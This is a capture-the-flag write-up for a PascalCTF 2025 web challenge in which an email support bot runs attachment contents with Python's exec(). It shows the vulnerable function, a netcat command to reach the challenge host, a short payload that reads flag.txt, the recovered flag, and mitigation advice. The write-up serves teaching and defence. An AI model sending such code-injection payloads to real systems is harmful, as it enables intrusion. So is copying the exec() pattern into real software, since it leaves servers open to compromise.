---
layout: writeup
title: "Surgo Company - Email Attachment RCE"
ctf: "PascalCTF 2025"
category: web
tags: [rce, python, misc, exec, code-injection, email, attachment]
difficulty: Medium
date: 2026-02-10
description: "Remote Code Execution vulnerability through malicious email attachment exploiting unsafe exec() usage"
---

## Challenge Description

![Challenge interface]({{ '/assets/images/challenge-description-surgo.png' | relative_url }})

The challenge presents an email support system where customers can submit tickets with attachments.

## Objective

Read the `flag.txt` file present on the challenge server.

## Analysis

### Understanding the Vulnerability

The program implements an email support system. When a customer replies with an attachment, it is processed by the following function:
```python
def check_attachment(filepath):
    with open(filepath, "r") as f:
        content = f.read()
    exec(content)
```

### Critical Problem

➡️ **The attachment content is executed directly with `exec()`**, without any validation or sanitization.

This allows for **Remote Code Execution (RCE)** via a text attachment containing valid Python code.

## Exploitation

### Step 1: Connect to the Service
```bash
nc surgobot.ctf.pascalctf.it 6005
```

### Step 2: Register with Email

Enter a valid email address provided by the email generator service.

### Step 3: Craft the Malicious Attachment

Reply to the received email **keeping the original subject** and attach a text file (`issue.txt`) containing the following payload:
```python
import os, __main__

base = os.path.dirname(__main__.__file__)
print(open(os.path.join(base, "flag.txt")).read())
```

![Email with malicious attachment]({{ '/assets/images/email-attachment.png' | relative_url }})

### Step 4: Retrieve the Flag

The code is executed server-side, and the content of `flag.txt` is displayed directly in the `nc` session.

![Flag retrieved through RCE]({{ '/assets/images/flag-output.png' | relative_url }})

## Flag

<div class="flag-box">
<strong>Flag:</strong><br>
<code>pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}</code>
</div>

## Vulnerability Details

- **Type:** Remote Code Execution (RCE)
- **Cause:** Dangerous use of `exec()` on unfiltered user input
- **Impact:** Complete server compromise, arbitrary code execution

## Key Techniques

- **Code Injection:** Exploiting `exec()` to run arbitrary Python code
- **File System Access:** Using `os` and `__main__` modules to locate files
- **Email-based Attack Vector:** Leveraging attachment processing as an entry point
- **Python Introspection:** Using `__main__.__file__` to find the script's directory

## Exploitation Breakdown

### Why This Works

1. **No Input Validation:** The server reads the attachment content without any checks
2. **Direct Execution:** `exec()` runs the content as Python code immediately
3. **Full Module Access:** The executed code has access to all Python modules
4. **File System Access:** We can read any file the server process has permissions for

### Payload Explanation
```python
import os, __main__  # Import necessary modules

# Get the directory where the main script is located
base = os.path.dirname(__main__.__file__)

# Read and print flag.txt from the same directory
print(open(os.path.join(base, "flag.txt")).read())
```

## Security Lessons

This challenge demonstrates several critical security principles:

1. **Never use `exec()` on user input** - This is one of the most dangerous functions in Python
2. **Input Validation is Crucial** - All user-supplied data must be validated and sanitized
3. **Principle of Least Privilege** - The server should run with minimal permissions
4. **Sandboxing** - User code should run in isolated environments if execution is necessary
5. **File Upload Security** - Attachments should be scanned and validated before processing

## Mitigation Strategies

To fix this vulnerability:
```python
# WRONG - Never do this
def check_attachment(filepath):
    with open(filepath, "r") as f:
        content = f.read()
    exec(content)  # ❌ Dangerous!

# BETTER - Validate file type and content
def check_attachment_safe(filepath):
    # Only allow specific file types
    allowed_extensions = ['.txt', '.pdf', '.jpg']
    if not any(filepath.endswith(ext) for ext in allowed_extensions):
        raise ValueError("Invalid file type")
    
    # Don't execute code - just read and store
    with open(filepath, "rb") as f:
        content = f.read()
    
    # Store securely without execution
    save_to_database(content)
```

## Tools Used

- Netcat (`nc`) - Network connection
- Email generator service - Temporary email for testing
- Python - Payload crafting
- Text editor - Creating the malicious attachment

## Conclusion

This challenge showcases a classic Remote Code Execution vulnerability caused by improper use of `exec()`. The lesson is clear: **never execute untrusted user input**, especially file attachments. Always validate, sanitize, and ideally avoid executing user-controlled code entirely.

The challenge name "Surgo Company" might be a play on "surge" or rising threats in email security, highlighting the importance of secure attachment handling in modern applications.
```

